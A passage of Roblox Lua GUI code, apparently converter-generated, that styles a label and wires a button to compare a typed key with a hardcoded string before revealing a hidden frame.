TextLabel_7.TextColor3 = Color3.fromRGB(255, 0, 0)
TextLabel_7.TextSize = 15.000

-- Scripts:

local function POAZF_fake_script() -- TextButton_15.LocalScript 
	local script = Instance.new('LocalScript', TextButton_15)

	script.Parent.MouseButton1Click:Connect(function()
		if script.Parent.Parent.TextBox.Text == "bwQ29oqpsuIo1" then
			script.parent.Parent.Parent.Key.Visible = false
			script.parent.Parent.Parent.Frame.Visible = true
		end
	end)
end
coroutine.wrap(POAZF_fake_script)()
